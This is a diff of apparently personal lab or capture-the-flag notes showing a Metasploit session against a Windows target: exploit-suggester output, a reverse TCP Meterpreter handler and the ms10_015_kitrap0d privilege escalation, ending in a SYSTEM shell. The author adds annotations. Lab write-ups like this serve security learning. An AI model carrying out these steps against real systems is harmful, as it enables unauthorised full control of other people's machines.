@@ -23,7 +23,7 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 [*] 10.129.30.24 - Collecting local exploits for x86/windows...
 [*] 10.129.30.24 - 34 exploit checks are being tried...
 [+] 10.129.30.24 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
-[+] 10.129.30.24 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.129.30.24 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.  <== using this exploit
 [+] 10.129.30.24 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
 [+] 10.129.30.24 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
 [+] 10.129.30.24 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
@@ -35,18 +35,8 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 [+] 10.129.30.24 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
 [+] 10.129.30.24 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
 meterpreter > 
-[*] 10.129.30.24 - Meterpreter session 1 closed.  Reason: Died
-msf5 exploit(multi/handler) > run 
-
-[*] Started reverse TCP handler on 10.10.14.114:5555 
-[*] Sending stage (176195 bytes) to 10.129.30.30
-[*] Meterpreter session 2 opened (10.10.14.114:5555 -> 10.129.30.30:49157) at 2020-10-29 16:36:08 -0700
-
-meterpreter > use exploit/windows/local/ms10_015_kitrap0d
-Loading extension exploit/windows/local/ms10_015_kitrap0d...
-[-] Failed to load extension: No module of the name exploit/windows/local/ms10_015_kitrap0d found
 meterpreter > background
-[*] Backgrounding session 2...
+[*] Backgrounding session 2...   <== important to know for later
 msf5 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf5 exploit(windows/local/ms10_015_kitrap0d) > options
 
@@ -54,7 +44,7 @@ Module options (exploit/windows/local/ms10_015_kitrap0d):
 
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
-   SESSION                   yes       The session to run this module on.
+   SESSION                   yes       The session to run this module on.   <== session infor from earlier
 
 
 Payload options (windows/meterpreter/reverse_tcp):
@@ -62,8 +52,8 @@ Payload options (windows/meterpreter/reverse_tcp):
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     192.168.1.22     yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
+   LHOST     192.168.1.22     yes       The listen address (an interface may be specified)   
+   LPORT     4444             yes       The listen port    
 
 
 Exploit target:
@@ -118,7 +108,6 @@ msf5 exploit(windows/local/ms10_015_kitrap0d) > run
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter > 
-
 ```
 
 # Load Powershell
